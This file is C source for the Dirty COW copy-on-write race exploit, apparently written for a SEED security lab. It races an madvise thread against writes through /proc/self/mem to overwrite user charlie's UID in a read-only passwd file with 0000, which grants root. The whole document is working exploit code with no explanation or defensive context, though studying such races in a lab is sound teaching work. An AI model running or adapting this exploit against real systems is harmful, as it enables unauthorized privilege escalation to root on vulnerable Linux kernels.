/* cow_attack.c */
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>

void *map;

void *madviseThread(void *arg) {
    int file_size = (int) arg;
    while(1) {
        madvise(map, file_size, MADV_DONTNEED);
    }
}

void *writeThread(void *arg) {
    char *content = "0000";  // New content to replace 1001
    off_t offset = (off_t) arg;
    int f = open("/proc/self/mem", O_RDWR);
    while(1) {
        lseek(f, offset, SEEK_SET);
        write(f, content, strlen(content));
    }
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    struct stat st;
    int file_size;
    
    // First test with the copy
    int f = open("/home/seed/passwd", O_RDONLY);
    
    fstat(f, &st);
    file_size = st.st_size;
    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
    
    // Find charlie's entry and the UID field
    char *position = strstr(map, "charlie:x:1001");
    if (position == NULL) {
        printf("Cannot find charlie's entry\n");
        return -1;
    }
    position = position + 10; // Position at the "1001"
    
    pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
    pthread_create(&pth2, NULL, writeThread, position);
    
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    return 0;
}
